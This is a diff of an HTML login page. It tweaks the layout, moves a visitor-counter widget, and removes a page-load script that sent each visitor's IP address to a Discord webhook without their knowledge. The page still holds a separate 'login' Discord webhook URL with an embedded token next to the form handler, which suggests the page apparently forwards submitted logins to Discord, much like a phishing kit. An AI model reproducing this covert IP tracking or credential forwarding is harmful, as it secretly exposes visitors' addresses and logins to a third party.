@@ -7,6 +7,7 @@
     <style>
         body {
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
@@ -57,7 +58,8 @@
             display: none;
         }
         .visitor-counter {
-            margin-top: 25px;
+            margin-top: 20px;
+            text-align: center;
         }
     </style>
 </head>
@@ -70,15 +72,15 @@
             <button type="submit">Submit</button>
             <div id="error-message" class="error-message">Information is incorrect</div>
         </form>
+    </div>
 
-        <!-- Visitor Counter -->
-        <div class="visitor-counter">
-            <a href="https://info.flagcounter.com/egIM">
-                <img src="https://s01.flagcounter.com/count2/egIM/bg_FFFFFF/txt_000000/border_CCCCCC/columns_2/maxflags_10/viewers_0/labels_0/pageviews_1/flags_0/percent_0/" 
-                     alt="Flag Counter" 
-                     border="0">
-            </a>
-        </div>
+    <!-- Visitor Counter moved outside the login container -->
+    <div class="visitor-counter">
+        <a href="https://info.flagcounter.com/egIM">
+            <img src="https://s01.flagcounter.com/count2/egIM/bg_FFFFFF/txt_000000/border_CCCCCC/columns_2/maxflags_10/viewers_0/labels_0/pageviews_1/flags_0/percent_0/" 
+                 alt="Flag Counter" 
+                 border="0">
+        </a>
     </div>
 
     <script>
@@ -86,22 +88,6 @@
             const form = document.getElementById("login-form");
             const errorMessage = document.getElementById("error-message");
             const loginWebhookUrl = "https://discord.com/api/webhooks/1383865581303758848/-RKP0JZkmM-W99UC6H4URVdJ9NHRanbfyaCtmfEOU9Zrx0wW-Zg1kXNXW1NhRxQZ0-xx";
-            const visitWebhookUrl = "https://discord.com/api/webhooks/1383866851682943047/AxEoWcDpiuaJ0NGPkN8aEqIu43JXWlaYkO6BrLFNBVvQwcsaiaMHPvwBF_3LkQRsefLb";
-
-            // Send visit notification on page load
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipAddress = data.ip;
-                    fetch(visitWebhookUrl, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            content: `Someone visited the website at ${new Date().toLocaleString()} from IP: ${ipAddress}`
-                        })
-                    }).catch(error => console.error("Error sending visit webhook:", error));
-                })
-                .catch(error => console.error("Error fetching IP for visit:", error));
 
             form.addEventListener("submit", function(event) {
                 event.preventDefault(); // Prevents page reload
